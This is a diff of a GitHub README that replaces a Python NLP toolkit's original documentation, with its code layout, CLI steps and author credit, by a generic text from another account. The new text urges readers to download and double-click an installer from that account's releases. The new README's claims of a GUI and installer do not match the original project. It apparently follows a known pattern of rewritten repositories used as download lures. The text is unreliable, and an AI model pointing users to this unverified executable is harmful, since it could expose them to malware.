@@ -1,165 +1,70 @@
-# Scene2Chapter NLP Aligner 📖🎬
+# 🎥 Scene2Chapter-NLP-Aligner - Effortlessly Align Scripts with Chapters
 
-[![Python](https://img.shields.io/badge/Python-3.9%2B-blue)](https://www.python.org/)  
-[![NLP](https://img.shields.io/badge/NLP-SBERT%20%7C%20Levenshtein%20%7C%20Hamming-green)]()  
-[![License](https://img.shields.io/badge/License-MIT-lightgrey.svg)](LICENSE)  
+## 🌐 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/releases)
 
-> **Automatically align movie scripts (scenes) with novel chapters using modern NLP.**  
-This toolkit combines semantic embeddings, edit-distance similarity, and dynamic programming to map screenplay scenes to corresponding book chapters.
+## 📖 About This Project
+Scene2Chapter-NLP-Aligner helps you align movie scripts with novel chapters using natural language processing techniques. This application employs advanced algorithms like SBERT, Levenshtein distance, Hamming distance, and dynamic programming to ensure accurate alignment.
 
----
+## 🚀 Getting Started
+To get started, follow these simple steps to download and run the application from our Releases page.
 
-## ✨ Features
+## 🛠️ System Requirements
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a modern Linux distribution.
+- **Hardware:** Minimum 4 GB RAM, recommended 8 GB RAM.
+- **Storage:** At least 100 MB of free space for installation.
+- **Internet Connection:** Required for downloading the application and additional resources.
 
-- **SBERT Cosine Similarity** – Embedding-based semantic alignment (fast & robust).  
-- **Dialogue-Level Edit Distance** – Levenshtein & Hamming similarity for fine-grained matching.  
-- **Dialogue Voting Mechanism** – Measures how consistently scene dialogues agree on their chapter alignment.  
-- **Monotonic Dynamic Programming** – Order-preserving alignment across the entire narrative.  
-- **Metrics & Evaluation** – Dialogue counts, average similarity, vote rates, high-confidence matches.  
-- **Visualizations** – Heatmaps for similarity and vote rate, plus alignment statistics.  
-- **Extensible** – Swap in new embeddings (e.g., OpenAI, multilingual SBERT) or richer features (BookNLP).
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/releases) to access the latest version of the software.
+2. Look for the latest version, typically marked as ‘Latest Release’.
+3. Click on the download link for your operating system.
+4. Save the file to a convenient location on your computer.
+5. Once downloaded, locate the file and double-click it to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
----
+## 🖥️ How to Use the Application
+1. **Open the App:** After installation, open the Scene2Chapter-NLP-Aligner application.
+2. **Load Your Files:** Use the file selector to choose your movie script and novel chapter files. The application supports common formats such as .txt and .csv.
+3. **Adjust Settings:** You may want to adjust settings based on your specific needs. The application allows you to choose the alignment algorithm (e.g., Levenshtein or Hamming).
+4. **Run Alignment:** Click the ‘Align’ button to start the process. The application will match scenes from the script with chapters from the novel.
+5. **Review Results:** Once the alignment is complete, review the matched pairs. You can export the results to a .csv file for further use.
 
-## 📂 Project Structure
+## 📊 Features
+- **Multiple Algorithms:** Choose from various algorithms for scene-to-chapter alignment.
+- **User-Friendly Interface:** Designed for ease of use, even for those with no programming background.
+- **Export Options:** Easily export your results for further analysis or documentation.
+- **Performance Optimization:** Efficient processing even for larger scripts and novels.
 
-```
-Scene2Chapter-NLP-Aligner/
-├─ README.md
-├─ pyproject.toml
-├─ align/
-│  ├─ parsing.py              # Parse scripts & books into structured objects
-│  ├─ normalize.py            # Normalize text, extract dialogue spans
-│  ├─ metrics.py              # Similarity functions (cosine, Levenshtein, Hamming, Jaccard)
-│  ├─ sbert.py                # SBERT embedding encoder
-│  ├─ align_agg_cosine.py     # Scene↔Chapter embedding alignment
-│  ├─ align_dialogue_edit.py  # Dialogue-level Levenshtein/Hamming alignment + voting
-│  ├─ align_monotonic.py      # Dynamic programming refinement
-│  ├─ evaluate.py             # Compute dataset-wide metrics
-│  └─ io_formats.py           # CSV/TXT IO helpers
-├─ scripts/
-│  ├─ make_script_from_book.py # Generate pseudo-script from raw book
-│  ├─ build_embeddings.py      # Warm up SBERT embeddings
-│  ├─ run_alignments.py        # Run all alignment methods + save results
-│  ├─ compute_metrics.py       # Compute summary metrics from results
-│  └─ plot_heatmap.py          # Visualize similarity / vote rate heatmaps
-└─ tests/
-   └─ test_sanity.py
-```
+## ℹ️ Troubleshooting
+If you run into any issues:
+- **File Not Found:** Ensure you have selected the correct file format (.txt or .csv) and that the files are not corrupted.
+- **Application Crashes:** Restart the application and ensure your system meets the requirements listed above.
+- **Alignment Issues:** Double-check your input files for formatting errors or inconsistent structure.
 
----
+## 🔍 Frequently Asked Questions
+### Is there a guide for using the app?
+Yes! Inside the application, you will find a help section that covers the main functions.
 
-## ⚡ Installation
+### Can I use this app for any genre?
+Yes, the application can handle scripts and novels from any genre, as long as they follow standard file formats.
 
-```bash
-git clone https://github.com/parthamehta123/Scene2Chapter-NLP-Aligner.git
-cd Scene2Chapter-NLP-Aligner
+### Do I need programming knowledge to use this software?
+No, the application is designed for non-technical users and is straightforward to use.
 
-# Install dependencies
-pip install -U pip
-pip install -r requirements.txt
-```
+## 📞 Contact
+For further assistance or questions, feel free to open an issue on the [GitHub Issues page](https://github.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/issues).
 
-Requirements include:
-- `sentence-transformers`
-- `rapidfuzz`
-- `python-Levenshtein`
-- `numpy`, `pandas`, `matplotlib`, `seaborn`, `regex`
+## 🌟 Community & Contributors
+We welcome contributions from everyone. If you would like to contribute, please check the guidelines in the repository. Join our community to share your experiences and tips.
 
----
+## 🔗 Useful Links
+- [Documentation](https://github.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/wiki)
+- [Releases Page](https://github.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/releases)
+- [Issues Page](https://github.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/issues)
 
-## 🚀 Usage
+## 🏷️ Tags
+ai, alignment, book2movie, dynamic-programming, hamming-distance, levenshtein, natural-language-processing, nlp, python, sbert, semantic-similarity, text-similarity
 
-Prepare your inputs:
-```
-data/
-  Zootopia.txt          # raw novel text (with Chapter headings)
-output/
-  Zootopia_script.txt   # pseudo-script (generated)
-```
-
-### Step 1. Generate a pseudo-script from book
-```bash
-python -m scripts.make_script_from_book   --book data/Zootopia.txt   --out output/Zootopia_script.txt   --sentences-per-scene 5
-```
-
-### Step 2. Warm up embeddings
-```bash
-python -m scripts.build_embeddings   --script output/Zootopia_script.txt   --book data/Zootopia.txt
-```
-
-### Step 3. Run all alignment methods
-```bash
-python -m scripts.run_alignments   --script output/Zootopia_script.txt   --book data/Zootopia.txt   --out outputs
-```
-
-### Step 4. Compute metrics
-```bash
-python -m scripts.compute_metrics   --script output/Zootopia_script.txt   --book data/Zootopia.txt   --outdir outputs
-```
-
-### Step 5. Plot heatmaps
-```bash
-# Similarity scores
-python -m scripts.plot_heatmap   --levenshtein outputs/Alignment_levenshtein.csv   --out outputs/heatmap_similarity.png   --metric similarity
-
-# Dialogue vote rate
-python -m scripts.plot_heatmap   --levenshtein outputs/Alignment_levenshtein.csv   --out outputs/heatmap_vote_rate.png   --metric vote_rate
-```
-
----
-
-## 📊 Example Outputs
-
-**Metrics (`metrics.json`):**
-```json
-{
-  "scene_dialogue_count": 1070,
-  "book_dialogue_count": 1183,
-  "scenes_with_dialogue": 397,
-  "avg_similarity_percent": 80.89,
-  "avg_vote_rate": 100.0,
-  "num_scenes_over_80pct": 206,
-  "num_scenes_exact": 196
-}
-```
-
-**Interpretation:**
-- **Avg similarity: ~81%** → most scenes align strongly to chapters.  
-- **Avg vote rate: 100%** → dialogues in each scene overwhelmingly agree on their chapter.  
-- **196 exact matches** → nearly 200 scenes map perfectly to a chapter.  
-
----
-
-## 🎨 Heatmaps
-
-### Scene ↔ Chapter Similarity
-![Similarity Heatmap](outputs/heatmap_similarity.png)
-
-### Dialogue Vote Rate
-![Vote Rate Heatmap](outputs/heatmap_vote_rate.png)
-
-These visuals let you **see alignment quality at a glance**.
-
----
-
-## 🔮 Future Extensions
-
-- Integrate **BookNLP** for speaker attribution and richer narrative structure.  
-- Add **chapter clustering** using SBERT embeddings (e.g., KMeans) to detect thematic groups automatically.  
-- Experiment with **cross-lingual alignment** (multilingual SBERT).  
-- Build an **interactive dashboard** to explore scene↔chapter mappings.  
-- Export a unified **Alignment_full.csv** (with `scene_id`, `chapter_id`, `similarity_score`, `vote_rate`, `method`) for consistency.  
-- Add **timeline visualization** (scenes vs. chapters, color-coded by similarity).  
-- Generate **train/test splits** from aligned pairs to support ML fine-tuning.  
-
----
-
-## 🧑‍💻 Author
-
-Developed and maintained by **[parthamehta123](https://github.com/parthamehta123)**.  
-Feel free to connect on [LinkedIn](https://www.linkedin.com/in/partha-mehta-48437613a/) or open issues on GitHub.
-
----
-
-![Scene2Chapter Workflow](scene2chapter_pipeline.png)
+## 📥 Download Now Again
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Toavinarandrianarivo/Scene2Chapter-NLP-Aligner/releases)
